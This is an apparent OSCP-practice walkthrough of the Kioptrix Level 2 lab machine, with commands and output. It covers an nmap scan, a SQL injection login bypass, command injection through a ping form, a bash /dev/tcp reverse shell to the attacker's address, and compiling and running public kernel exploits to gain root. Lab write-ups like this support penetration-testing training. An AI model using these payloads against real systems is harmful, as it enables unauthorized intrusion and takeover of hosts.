# OSCP Vulnhub Set 1 - Kioptrix: Level 1.1 (#2)

lab link: http://ccmtlab.ccmt.home.arpa:8888/user/missions/boxes?uuid=310958ee-e03d-4545-bcf0-f5de26a76405

target ip: `10.101.85.12`

---

## Scanning and Enumeration

### nmap

find the service that running on that target ip.

```
nmap -A -sC -sV 10.101.85.12
```

- -A : Aggressive Scan
- -sC : Default Script Scan
- -sV : Version Detection

found ssh, http and etc. that running on terget ip.

```
┌──(kali㉿kali)-[~/Desktop/ccmtlab/02]
└─$ nmap -A -sC -sV 10.101.85.12
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-14 05:22 -0400
Nmap scan report for 10.101.85.12
Host is up (0.0034s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)
|_sshv1: Server supports SSHv1
| ssh-hostkey: 
|   1024 8f:3e:8b:1e:58:63:fe:cf:27:a3:18:09:3b:52:cf:72 (RSA1)
|   1024 34:6b:45:3d:ba:ce:ca:b2:53:55:ef:1e:43:70:38:36 (DSA)
|_  1024 68:4d:8c:bb:b6:5a:bd:79:71:b8:71:47:ea:00:42:61 (RSA)
80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))
|_http-server-header: Apache/2.0.52 (CentOS)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
111/tcp  open  rpcbind  2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1            901/udp   status
|_  100024  1            904/tcp   status
443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_RC4_64_WITH_MD5
|_    SSL2_RC4_128_WITH_MD5
|_ssl-date: 2026-05-14T13:23:18+00:00; +4h00m06s from scanner time.
|_http-server-header: Apache/2.0.52 (CentOS)
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2009-10-08T00:10:47
|_Not valid after:  2010-10-08T00:10:47
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
631/tcp  open  ipp      CUPS 1.1
|_http-title: 403 Forbidden
| http-methods: 
|_  Potentially risky methods: PUT
|_http-server-header: CUPS/1.1
3306/tcp open  mysql    MySQL (unauthorized)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.27
Network Distance: 2 hops

Host script results:
|_clock-skew: 4h00m05s

TRACEROUTE (using port 21/tcp)
HOP RTT     ADDRESS
1   5.62 ms 10.101.55.1
2   6.63 ms 10.101.85.12

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.39 seconds
```

---

### http explore

open the target ip in browser to find the way to enter the target machine.

```
http://10.101.85.12
```

it's login page, that quite interesting.

![](./images/01.png)

i look at the page source, but nothing useful now.

```
<html>
<body>
<form method="post" name="frmLogin" id="frmLogin" action="index.php">
	<table width="300" border="1" align="center" cellpadding="2" cellspacing="2">
		<tr>
			<td colspan='2' align='center'>
			<b>Remote System Administration Login</b>
			</td>
		</tr>
		<tr>
			<td width="150">Username</td>
			<td><input name="uname" type="text"></td>
		</tr>
		<tr>
			<td width="150">Password</td>
			<td>
			<input name="psw" type="password">
			</td>
		</tr>
		<tr>
			<td colspan="2" align="center">
			<input type="submit" name="btnLogin" value="Login">
			</td>
		</tr>
	</table>
</form>

<!-- Start of HTML when logged in as Administator -->
</body>
</html>
```
i think i should try sql injection for login to this site.

---

## Exploitation

### sql injection

let's use the most popular payload first, put it into username and password.

```
' or 1=1 --
```

it's success, i can bypass login to this site.

![](./images/02.png)

i'll test this feature by entering my ip into the field and hitting submit.

```
10.101.55.75
```

this feature can ping to my ip, interesting.

```
10.101.55.75

PING 10.101.55.75 (10.101.55.75) 56(84) bytes of data.
64 bytes from 10.101.55.75: icmp_seq=0 ttl=63 time=3.65 ms
64 bytes from 10.101.55.75: icmp_seq=1 ttl=63 time=2.39 ms
64 bytes from 10.101.55.75: icmp_seq=2 ttl=63 time=2.71 ms

--- 10.101.55.75 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2002ms
rtt min/avg/max/mdev = 2.395/2.922/3.654/0.534 ms, pipe 2

```

i think i can use command chaining.

---

### command chaining

let's try to add more command into that field.

```
10.101.55.75; id
```

- use `10.101.55.75` to ping my ip
- use `;` to command chaining
- use `id` to identify target user

it's work, command `id` is executed and the output show `uid=48(apache) gid=48(apache) groups=48(apache)`.

```
10.101.55.75; id

PING 10.101.55.75 (10.101.55.75) 56(84) bytes of data.
64 bytes from 10.101.55.75: icmp_seq=0 ttl=63 time=1.72 ms
64 bytes from 10.101.55.75: icmp_seq=1 ttl=63 time=1.97 ms
64 bytes from 10.101.55.75: icmp_seq=2 ttl=63 time=2.60 ms

--- 10.101.55.75 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2002ms
rtt min/avg/max/mdev = 1.727/2.102/2.606/0.373 ms, pipe 2
uid=48(apache) gid=48(apache) groups=48(apache)

```

that's mean i can also execute another command, such as reverse shell.

---

### reverse shell

i'll try to get reverse shell, search this page for payload.
```
https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
```

create listener on `kali`.

```
rlwrap nc -lvp 1234
```

let's try payload for `bash`, use it with command chaining.

```
10.101.55.75; bash -i >& /dev/tcp/10.101.55.75/1234 0>&1
```

success, now i have reverse shell.

```
┌──(kali㉿kali)-[~/Desktop/ccmtlab/02]
└─$ rlwrap nc -lvp 1234
listening on [any] 1234 ...
10.101.85.12: inverse host lookup failed: Unknown host
connect to [10.101.55.75] from (UNKNOWN) [10.101.85.12] 32807
bash: no job control in this shell
bash-3.00$ 
```

let's privilege escalation

---

## Privilege Escalation

### system enumeration

i'll use this script to do system enumeration.

```
https://github.com/diego-treitos/linux-smart-enumeration/blob/master/lse.sh
```

download it into `kali`.

```
wget https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/refs/heads/master/lse.sh
```

i want to send it to target machine, let's open a local web server to host the file.

```
python3 -m http.server 80
```

move to `/tmp` because it has write permissions and download the script to target.

```
cd /tmp
wget http://10.101.55.75/lse.sh
```

make it executable, then run it.

```
chmod 777 lse.sh
./lse.sh
```

it’s `centos 4.5` and `linux 2.6.9`.

```
bash-3.00$ ./lse.sh
---
If you know the current user password, write it here to check sudo privileges: 
---
                                                                                                                    
 LSE Version: 4.14nw                                                                                                

        User: apache
     User ID: 48
    Password: none
        Home: /
        Path: /sbin:/usr/sbin:/bin:/usr/bin:/usr/X11R6/bin
       umask: 0022

    Hostname: kioptrix.level2
       Linux: 2.6.9-55.EL
Distribution: CentOS release 4.5 (Final)
Architecture: i686
```

now, i want to search for the exploit for this machine

---

### exploit 1397

i google it to find the exploit, then i found this document.

```
https://www.exploit-db.com/exploits/1397
```

download exploit by `searchsploit`.

```
searchsploit -m 1397
```

download to target machine, then excute it.

```
wget http://10.101.55.75/1397.c
gcc -o k-rad3 1397.c -static -O2
./k-rad3 -t 1 -p 2
```

fail, i think i miss something.

```
bash-3.00$ wget http://10.101.55.75/1397.c
--06:49:38--  http://10.101.55.75/1397.c
           => `1397.c'
Connecting to 10.101.55.75:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 17,060 (17K) [text/x-csrc]

    0K .......... ......                                     100%    4.22 MB/s

06:49:38 (4.22 MB/s) - `1397.c' saved [17060/17060]

bash-3.00$ gcc -o k-rad3 1397.c -static -O2
1397.c:730:28: warning: no newline at end of file
bash-3.00$ ./k-rad3 -t 1 -p 2
[  k-rad3 - <=linux 2.6.11 CPL 0 kernel exploit  ]
[ Discovered Jan 2005 by sd <sd@fucksheep.org> ]
[ Modified 2005/9 by alert7 <alert7@xfocus.org> ]
[+] try open /proc/cpuinfo .. ok!!
[+] find cpu flag pse in /proc/cpuinfo
[+] CONFIG_X86_PAE :none
[+] Cpu flag: pse ok
[+] Exploit Way : 0
[+] Use 2 pages (one page is 4K ),rewrite 0xc0000000--(0xc0002000 + n)
[+] thread_size 1 (0 :THREAD_SIZE is 4096;otherwise THREAD_SIZE is 8192 
epoll_wait: Invalid argument
Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 i686 i386 GNU/Linux
[+] idtr.base 0xc03fd000 ,base 0xc0000000
[+] kwrite base 0xc0000000, buf 0xbff867b0,num 8196
[-] This kernel not vulnerability!!!
```

let's search for another exploit.

---

### exploit 9545

i found another exploit in this document, this seems to match the target machine distribution better than the previous one.

```
https://www.exploit-db.com/exploits/9545
```

let's try again, download it to `kali`

```
searchsploit -m 9545
```

download to target machine, then excute it.

```
wget http://10.101.55.75/9545.c
gcc -Wall -o linux-sendpage 9545.c
./linux-sendpage
```

success.

```
bash-3.00$ wget http://10.101.55.75/9545.c
--07:21:06--  http://10.101.55.75/9545.c
           => `9545.c'
Connecting to 10.101.55.75:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 9,408 (9.2K) [text/x-csrc]

    0K .........                                             100%    1.67 MB/s

07:21:06 (1.67 MB/s) - `9545.c' saved [9408/9408]

bash-3.00$ gcc -Wall -o linux-sendpage 9545.c
9545.c:376:28: warning: no newline at end of file
bash-3.00$ ./linux-sendpage
sh: no job control in this shell
sh-3.00# id
uid=0(root) gid=0(root) groups=48(apache)
```

now, i'm root.